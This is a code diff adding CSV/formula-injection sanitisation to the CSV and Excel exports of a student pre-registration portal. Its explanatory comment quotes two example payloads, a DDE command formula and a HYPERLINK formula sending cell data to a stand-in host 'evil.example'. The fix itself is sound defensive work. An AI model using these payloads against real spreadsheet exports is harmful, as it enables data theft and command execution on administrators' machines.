@@ -60,6 +60,34 @@ export function toExportRows(registrations) {
   }))
 }
 
+/**
+ * Neutralizes CSV/formula injection.
+ *
+ * Every field here (name, email, School ID) is attacker-controlled - it
+ * comes straight from the public registration form. A first name of
+ * `=cmd|'/c calc'!A1` or `=HYPERLINK("https://evil.example/steal?"&A1)`
+ * sits inert in the database and in a PDF, but Excel/Sheets treats it as a
+ * live formula the instant an admin opens the exported CSV/XLSX - which can
+ * exfiltrate other cells in the sheet or worse. Prefixing a leading
+ * '=', '+', '-', '@', tab, or CR with a single quote forces spreadsheet
+ * apps to treat the cell as plain text instead (the standard OWASP
+ * mitigation for this exact class of bug). Only applied to CSV/Excel -
+ * PDF/DOCX can't execute formulas, so prefixing there would just be visual
+ * noise on people's names for no security benefit.
+ */
+function sanitizeForSpreadsheet(value) {
+  const text = String(value ?? '')
+  return /^[=+\-@\t\r]/.test(text) ? `'${text}` : text
+}
+
+function sanitizeRowForSpreadsheet(row) {
+  const safe = {}
+  for (const [key, value] of Object.entries(row)) {
+    safe[key] = sanitizeForSpreadsheet(value)
+  }
+  return safe
+}
+
 function downloadBlob(blob, filename) {
   const url = URL.createObjectURL(blob)
   const link = document.createElement('a')
@@ -78,7 +106,7 @@ function csvEscape(value) {
 }
 
 export function exportCSV(registrations, filename = 'smcbi-approved-registrations.csv') {
-  const rows = toExportRows(registrations)
+  const rows = toExportRows(registrations).map(sanitizeRowForSpreadsheet)
   const lines = [
     EXPORT_COLUMNS.join(','),
     ...rows.map((row) => EXPORT_COLUMNS.map((column) => csvEscape(row[column])).join(',')),
@@ -89,7 +117,7 @@ export function exportCSV(registrations, filename = 'smcbi-approved-registration
 
 export async function exportExcel(registrations, filename = 'smcbi-approved-registrations.xlsx') {
   const ExcelJS = (await import('exceljs')).default
-  const rows = toExportRows(registrations)
+  const rows = toExportRows(registrations).map(sanitizeRowForSpreadsheet)
 
   const workbook = new ExcelJS.Workbook()
   workbook.creator = 'SMCBI Student Pre-Registration Portal'
